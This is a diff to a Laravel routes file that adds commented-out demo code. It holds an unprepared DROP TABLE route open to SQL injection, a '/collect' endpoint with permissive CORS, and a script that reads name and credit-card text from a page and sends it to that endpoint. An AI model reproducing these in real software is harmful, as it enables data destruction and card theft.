@@ -59,3 +59,31 @@ Route::get('/prime', function () {
 Route::get('/test', function () {
     return view('test');
 });
+
+
+// Route::get('sqli',function(Request $request){
+//     $table =$request->query('table');
+//     DB::unprepared("DROP TABLE $table");
+//     return redirect('/')->with('success', 'Table deleted successfully');
+// });
+
+
+// Route::get('/collect',function(Request $request){
+//     $name = $request->query('name');
+
+//     $credit = $request->query('credit');
+//     return response ('Data collected, 200')
+//     ->header('Access-Control-Allow-Origin', '*')
+//     ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
+//     ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
+// });
+
+// <script>
+// let name = document.getElementById('name').textContent;
+// let credit = document.getElementById('credit').textContent;
+// alert(name + credit);
+// let xhr = new XMLHttpRequest();
+// xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
+// xhr.send();
+// </script>
+
